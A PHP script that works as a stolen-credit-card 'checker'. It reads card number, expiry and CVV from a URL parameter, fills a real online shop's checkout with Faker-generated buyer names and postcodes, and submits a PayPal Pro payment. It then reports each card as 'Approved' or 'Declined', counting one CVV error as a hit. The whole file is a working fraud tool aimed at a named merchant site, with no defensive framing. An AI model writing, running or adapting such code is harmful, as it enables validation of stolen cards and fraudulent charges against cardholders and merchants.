<?php

require_once 'autoload.php';
require_once 'curl.php';

if(!$_GET['card']){
    echo "Invalid Card";
    die();
}

$i = explode("|", $_GET['card']);
$cc = $i[0];
$mes = $i[1];
$ano = $i[2];
$cvv = $i[3];

$cardnumber = preg_replace('/^(\d{4})(\d{4})(\d{4})(\d{1,4})$/', '$1 $2 $3 $4', $cc);

$faker = Faker\Factory::create('en_US');
$first_name = $faker->firstName;
$last_name = $faker->lastName;
$postal_code = $faker->postcode;
$phone = '55' . $faker->randomNumber(8);


$Curl = new CurlRequestHandler();
$response = $Curl->performCurlRequest("https://redcapcards.com/wp-admin/admin-ajax.php", "POST", [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
], 'action=woocommerce_add_to_cart_variable_rc&product_id=47627&quantity=1&variation_id=47628&variation%5Battribute_pa_packaging%5D=single');

$response = $Curl->performCurlRequest("https://redcapcards.com/checkout/", "GET");
$nonce = trim(strip_tags($Curl->capture($response, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="', '" />')));

$response = $Curl->performCurlRequest("https://redcapcards.com/?wc-ajax=checkout", "POST", [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
], 'billing_first_name='.$first_name.'&billing_last_name='.$last_name.'&billing_company=&billing_country=US&billing_address_1=9330+East+Columbus+Drive&billing_address_2=&billing_city=Tampa&billing_state=FL&billing_postcode='.$postal_code.'&billing_phone=6529291929&billing_email=jsentaurojk%40gmail.com&account_username=&account_password=&account_confirm_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=BR&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fredcapcards.com%2Fcart-2%2F&wc_order_attribution_session_start_time=2024-05-28+13%3A15%3A39&wc_order_attribution_session_pages=4&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F125.0.0.0+Safari%2F537.36&shipping_method%5B0%5D=mh_wc_table_rate&payment_method=paypal_pro&paypal_pro-card-number='.urlencode($cardnumber).'&paypal_pro-card_expiration_month='.$mes.'&paypal_pro-card_expiration_year='.$ano.'&paypal_pro-card-cvc='.$cvv.'&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
$code = trim(strip_tags(json_decode($response, true)['messages']));
if(strpos($response, '"result":"success"')){
    $code = "Successful payment ($10)";
} elseif(empty($response)){
    $code = "Error in payment";
}

if($code == "15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number." || $code == "Successful payment ($10)"){
    $response = "Approved ✅ - $code";
} else {
    $response = " Declined ❌ - $code";
}
echo $response;